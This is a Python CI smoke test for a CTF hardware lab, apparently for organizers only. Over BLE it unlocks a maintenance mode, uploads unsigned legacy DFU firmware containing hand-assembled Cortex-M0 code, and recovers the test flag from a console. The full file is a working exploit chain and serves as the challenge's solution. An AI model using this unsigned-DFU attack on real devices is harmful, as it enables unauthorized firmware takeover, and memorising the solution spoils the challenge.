#!/usr/bin/env python3
"""Organizer-only end-to-end exploit smoke test for the extracted player lab.

This file is intentionally excluded from both release ZIPs.  CI copies it into
the already-verified attachment workspace, then proves that a player script can
cross the maintenance gate, perform unsigned legacy DFU, execute Thumb code,
and recover the local test flag through the BLE console.
"""

from __future__ import annotations

import argparse
import asyncio
from contextlib import suppress
import struct
import time

from bumble.core import UUID
from bumble.device import Device, Peer
from bumble.hci import Address
from bumble.transport import open_transport

from hitcon_legacy_dfu.protocol import (
    CONSOLE_OUTPUT_UUID,
    CONSOLE_SERVICE_UUID,
    CONTROL_POINT_UUID,
    MAINTENANCE_CONTROL_UUID,
    MAINTENANCE_SERVICE_UUID,
    PACKET_UUID,
    SERVICE_UUID,
    DfuImageType,
    DfuOpcode,
    DfuResponse,
    LegacyInitPacket,
)


TARGET_ADDRESS = Address("F6:F7:F8:F9:FA:FB")
MAINTENANCE_REQUEST = bytes.fromhex("11451419198100")
EXPECTED_LOCAL_FLAG = b"CTF{local_emulator_test_flag}\n"
GPIO_P0_IN = 0x5000_0510
UART0_TXD = 0x4000_251C


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser()
    parser.add_argument("--transport", default="tcp-client:host:6402")
    return parser.parse_args()


def make_flag_payload(bytes_to_read: int) -> bytes:
    """Build a word-aligned Cortex-M0 image that copies GPIO words to UART."""

    if bytes_to_read <= 0 or bytes_to_read % 4:
        raise ValueError("bytes_to_read must be a positive multiple of four")
    application_base = 0x0001_B000
    code_offset = 0x100
    vector_table = struct.pack(
        "<II",
        0x2000_8000,
        application_base + code_offset + 1,
    )
    instructions = [0x4800, 0x4A00]
    for _ in range(bytes_to_read // 4):
        instructions.extend((0x6801, 0x6011))
    instructions.append(0xE7FE)

    encoded = struct.pack(f"<{len(instructions)}H", *instructions)
    literal_padding = b"\x00\x00" if len(encoded) % 4 else b""
    literal_address = application_base + code_offset + len(encoded) + len(literal_padding)
    pc_base = application_base + code_offset + 4
    instructions[0] |= (literal_address - pc_base) // 4
    instructions[1] |= (literal_address + 4 - pc_base) // 4
    encoded = struct.pack(f"<{len(instructions)}H", *instructions)
    return (
        vector_table
        + b"\xff" * (code_offset - len(vector_table))
        + encoded
        + literal_padding
        + struct.pack("<II", GPIO_P0_IN, UART0_TXD)
    )


async def reconnect(device: Device, timeout: float = 20.0):
    deadline = time.monotonic() + timeout
    last_error: Exception | None = None
    while time.monotonic() < deadline:
        try:
            return await device.connect(TARGET_ADDRESS, timeout=1)
        except Exception as exc:
            last_error = exc
            await asyncio.sleep(0.05)
    raise TimeoutError("target did not advertise again") from last_error


async def expect_notification(
    queue: asyncio.Queue[bytes], expected: bytes, timeout: float = 10.0
) -> None:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        received = bytes(
            await asyncio.wait_for(
                queue.get(),
                timeout=max(0.01, deadline - time.monotonic()),
            )
        )
        if received == expected:
            return
    raise TimeoutError(f"notification not received: {expected.hex()}")


async def run(args: argparse.Namespace) -> bytes:
    image = make_flag_payload(32)
    if len(image) % 4:
        raise RuntimeError("smoke payload is not word-aligned")

    async with await open_transport(args.transport) as transport:
        device = Device.with_hci(
            "attachment-exploit-smoke",
            Address("F0:F1:F2:F3:F4:F5"),
            transport.source,
            transport.sink,
        )
        connections = []
        try:
            await device.power_on()

            initial = await device.connect(TARGET_ADDRESS, timeout=15)
            connections.append(initial)
            initial_disconnected = asyncio.Event()
            initial.on(
                initial.EVENT_DISCONNECTION,
                lambda *_args: initial_disconnected.set(),
            )
            initial_peer = Peer(initial)
            maintenance_services = await initial_peer.discover_service(
                UUID(MAINTENANCE_SERVICE_UUID)
            )
            if len(maintenance_services) != 1:
                raise RuntimeError("maintenance service not found")
            await initial_peer.discover_characteristics(service=maintenance_services[0])
            maintenance_control = initial_peer.get_characteristics_by_uuid(
                UUID(MAINTENANCE_CONTROL_UUID), maintenance_services[0]
            )[0]
            await initial_peer.write_value(
                maintenance_control,
                MAINTENANCE_REQUEST,
                with_response=True,
            )
            await asyncio.wait_for(initial_disconnected.wait(), timeout=10)

            dfu = await reconnect(device)
            connections.append(dfu)
            dfu_disconnected = asyncio.Event()
            dfu.on(dfu.EVENT_DISCONNECTION, lambda *_args: dfu_disconnected.set())
            dfu_peer = Peer(dfu)
            dfu_services = await dfu_peer.discover_service(UUID(SERVICE_UUID))
            if len(dfu_services) != 1:
                raise RuntimeError("legacy DFU service not found after reset")
            await dfu_peer.discover_characteristics(service=dfu_services[0])
            control = dfu_peer.get_characteristics_by_uuid(
                UUID(CONTROL_POINT_UUID), dfu_services[0]
            )[0]
            packet = dfu_peer.get_characteristics_by_uuid(
                UUID(PACKET_UUID), dfu_services[0]
            )[0]
            notifications: asyncio.Queue[bytes] = asyncio.Queue()
            await dfu_peer.subscribe(control, notifications.put_nowait)

            await dfu_peer.write_value(
                control,
                bytes((DfuOpcode.START_DFU, DfuImageType.APPLICATION)),
                with_response=True,
            )
            await dfu_peer.write_value(packet, struct.pack("<III", 0, 0, len(image)))
            await expect_notification(
                notifications,
                bytes((DfuOpcode.RESPONSE_CODE, DfuOpcode.START_DFU, DfuResponse.SUCCESS)),
            )

            init_packet = LegacyInitPacket.for_image(image).encode()
            await dfu_peer.write_value(
                control,
                bytes((DfuOpcode.INITIALIZE_DFU_PARAMETERS, 0)),
                with_response=True,
            )
            await dfu_peer.write_value(packet, init_packet)
            await dfu_peer.write_value(
                control,
                bytes((DfuOpcode.INITIALIZE_DFU_PARAMETERS, 1)),
                with_response=True,
            )
            await expect_notification(
                notifications,
                bytes(
                    (
                        DfuOpcode.RESPONSE_CODE,
                        DfuOpcode.INITIALIZE_DFU_PARAMETERS,
                        DfuResponse.SUCCESS,
                    )
                ),
            )

            await dfu_peer.write_value(
                control,
                bytes((DfuOpcode.PACKET_RECEIPT_NOTIFICATION_REQUEST, 1, 0)),
                with_response=True,
            )
            await dfu_peer.write_value(
                control,
                bytes((DfuOpcode.RECEIVE_FIRMWARE_IMAGE,)),
                with_response=True,
            )
            for offset in range(0, len(image), 20):
                await dfu_peer.write_value(packet, image[offset : offset + 20])
            await expect_notification(
                notifications,
                bytes(
                    (
                        DfuOpcode.RESPONSE_CODE,
                        DfuOpcode.RECEIVE_FIRMWARE_IMAGE,
                        DfuResponse.SUCCESS,
                    )
                ),
            )

            await dfu_peer.write_value(
                control,
                bytes((DfuOpcode.VALIDATE_FIRMWARE,)),
                with_response=True,
            )
            await expect_notification(
                notifications,
                bytes(
                    (
                        DfuOpcode.RESPONSE_CODE,
                        DfuOpcode.VALIDATE_FIRMWARE,
                        DfuResponse.SUCCESS,
                    )
                ),
            )
            await dfu_peer.write_value(
                control,
                bytes((DfuOpcode.ACTIVATE_AND_RESET,)),
                with_response=True,
            )
            await asyncio.wait_for(dfu_disconnected.wait(), timeout=10)

            application = await reconnect(device)
            connections.append(application)
            application_peer = Peer(application)
            console_services = await application_peer.discover_service(
                UUID(CONSOLE_SERVICE_UUID)
            )
            if len(console_services) != 1:
                raise RuntimeError("console service not found after payload reset")
            await application_peer.discover_characteristics(service=console_services[0])
            output = application_peer.get_characteristics_by_uuid(
                UUID(CONSOLE_OUTPUT_UUID), console_services[0]
            )[0]
            recovered = bytes(await application_peer.read_value(output)).rstrip(b"\x00")
            if recovered != EXPECTED_LOCAL_FLAG:
                raise RuntimeError(f"unexpected console output: {recovered!r}")
            return recovered
        finally:
            for connection in reversed(connections):
                with suppress(Exception):
                    await connection.disconnect()
            with suppress(Exception):
                await device.power_off()


def main() -> int:
    recovered = asyncio.run(run(parse_args()))
    print(f"local exploit OK: recovered {recovered!r}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
